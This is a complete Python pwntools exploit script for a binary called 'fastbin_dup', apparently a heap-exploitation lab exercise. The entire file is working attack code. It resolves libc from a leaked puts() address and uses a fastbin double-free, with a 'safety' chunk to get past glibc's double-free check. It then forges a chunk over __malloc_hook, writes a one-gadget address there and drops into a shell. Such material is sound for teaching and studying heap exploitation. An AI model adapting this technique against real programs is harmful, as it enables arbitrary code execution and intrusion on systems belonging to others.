#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.recvuntil("> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# Ignore the "username" field.
username = "George"
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request two 0x70-sized chunks.
# The most-significant byte of the _IO_wide_data_0 vtable pointer (0x7f) is used later as a size field.
# The "dup" chunk will be duplicated, the "safety" chunk is used to bypass the fastbins double-free mitigation.
dup = malloc(0x68, "A"*8)
safety = malloc(0x68, "B"*8)

# Leverage the double-free bug to free the "dup" chunk, then the "safety" chunk, then the "dup" chunk again.
# This way the "dup" chunk is not at the head of the 0x70 fastbin when it is freed for the second time,
# bypassing the fastbins double-free mitigation.
free(dup)
free(safety)
free(dup)

# The next request for a 0x70-sized chunk will be serviced by the "dup" chunk.
# Request it, then overwrite its fastbin fd, pointing it to the fake chunk overlapping the malloc hook,
# specifically where the 0x7f byte of the _IO_wide_data_0 vtable pointer will form the least-significant byte of the size field.
malloc(0x68, p64(libc.sym.__malloc_hook - 0x23))

# Make two more requests for 0x70-sized chunks. The "safety" chunk, then the "dup" chunk are allocated to service these requests.
malloc(0x68, "C"*8)
malloc(0x68, "D"*8)

# The next request for a 0x70-sized chunk is serviced by the fake chunk overlapping the malloc hook.
# Use it to overwrite the malloc hook with the address of a one-gadget.
malloc(0x68, b"X"*0x13 + p64(libc.address + 0xe1fa1)) # [rsp+0x50] == NULL

# The next call to malloc() will instead call the one-gadget and drop a shell.
# The argument to malloc() is irrelevant, as long as it passes the program's size check.
malloc(0x18, "")

# =============================================================================

io.interactive()
